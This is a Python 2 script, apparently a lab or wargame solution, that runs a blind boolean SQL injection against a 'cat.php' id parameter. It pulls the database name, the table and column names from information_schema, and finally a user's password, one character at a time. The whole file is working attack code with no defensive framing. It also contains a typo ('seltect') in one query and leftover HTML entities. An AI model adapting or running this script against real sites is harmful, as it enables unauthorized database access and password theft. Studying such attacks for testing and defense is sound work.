#!/usr/bin/python
import urllib, urllib2
import sys
 
# Connect URL
def urlcon(query):
    method = "id=" + urllib.quote(query)   # url encode
    #method += "&amp;"
    #method += "pw=asd"
 
    url = urllib2.Request('http://testsite.com/cat.php?' + method)
    s = urllib2.urlopen(url)
 
    result = s.read()
 
    s.close()
 
    # Check
    if result.find("hacker") == -1:
        return 0    # failed
    else:
        return 1    # success
 
# Get a current DB Name
def get_db():
    length = 0
    db = ""
 
    for i in range(1, 30, 1):        # Get Length
        query = "1 or 1=1 and substr((select length(database())), 1, 2) = '{0}'#".format(i)
        if urlcon(query) == 1:
            length = i
            break
    
    print "Length : {0}".format(length)
    
    for i in range(length):
        for j in range(0, 127, 1):
            query = "1 or 1=1 and ascii(substr((select database()), {0}, 1)) = '{1}'#".format(i+1, j)
            if urlcon(query) == 1:
                db += chr(j)
                break
        print db
 
    print "================================================================="
    print "Result : " + db
 
    return db
 
# Get Tables
def get_table():
    tlist = []
    index = 0
 
    while 1:
        length = 0
        for i in range(1, 30, 1):        # Get Length
            query = "1 or 1=1 and substr((select length(table_name) from information_schema.tables where table_type='base table' limit {0},1),1,2) = '{1}' #".format(index, i)
            if urlcon(query) == 1:
                length = i
                break
 
        if length == 0:
            print "================================================================="
            print "Complete"
            break
        
        print "Length : {0}".format(length)
        table = ""
        for i in range(length):
            for j in range(0, 127, 1):
                query = "1 or 1=1 and ascii(substr((seltect table_name from information_schema.tables where table_type='base table' limit {0},1),{1},1)) = '{2}' #".format(index, i+1, j)
                if urlcon(query) == 1:
                    table += chr(j)
                    break
            print table
        tlist.append(table)
        index += 1
 
    print tlist
    return tlist
 
# Get Columns
def get_column(table):
    clist = []
    index = 0
 
    while 1:
        length = 0
        for i in range(1, 30, 1):        # Get Length
            query = "1 or 1=1 and substr((select length(column_name) from information_schema.columns where table_name='{0}' limit {1},1),1,2) = '{2}' #".format(table, index, i)
            if urlcon(query) == 1:
                length = i
                break
 
        if length == 0:
            print "================================================================="
            print "Complete"
            break
        
        print "Length : {0}".format(length)
        column = ""
        for i in range(length):
            for j in range(0, 127, 1):
                query = "1 or 1=1 and ascii(substr((select column_name from information_schema.columns where table_name='{0}' limit {1},1),{2},1)) = '{3}' #".format(table, index, i+1, 

j)
                if urlcon(query) == 1:
                    column += chr(j)
                    break
            print column
        clist.append(column)
        index += 1
 
    print clist
    return clist
 
# Get a Value
def get_value(table, ID):
    length = 0
    pw = ""
 
    for i in range(1, 30, 1):        # Get Length
        query = "1 or 1=1 and substr((select length(pw) from {0} where id='{1}' limit 0,1),1,2) = '{2}' #".format(table, ID, i)
        if urlcon(query) == 1:
            length = i
            break
    
    print "Length : {0}".format(length)
    
    for i in range(length):
        for j in range(0, 127, 1):
            query = "1 or 1=1 and ascii(substr((select pw from {0} where id='{1}' limit 0,1),{2},1)) = '{3}' #".format(table, ID, i+1, j)
            if urlcon(query) == 1:
                pw += chr(j)
                break
        print pw
 
    print "================================================================="
    print "Result : " + pw
 
    return pw
 
# Main Function
if __name__ == '__main__':
    print "================================================================="
    print "Blind SQL Injection"
    print "=================================================================\n"
 
    argc = len(sys.argv)
    if argc &gt;= 2:
        if int(sys.argv[1]) == 1:
            get_db()
        elif int(sys.argv[1]) == 2:
            get_table()
        elif (int(sys.argv[1]) == 3) and sys.argv[2]:
            get_column(sys.argv[2])        # Table Name is "accounts".
        elif (int(sys.argv[1]) == 4) and sys.argv[2] and sys.argv[3]:
            get_value(sys.argv[2], sys.argv[3])    # Table Name is "accounts", ID is "tribal".
        else:
            print "Usage : {0} <num> [Table Name] [ID]".format(sys.argv[0])
    else:
        print "Usage : {0} <num> [Table Name] [ID]".format(sys.argv[0])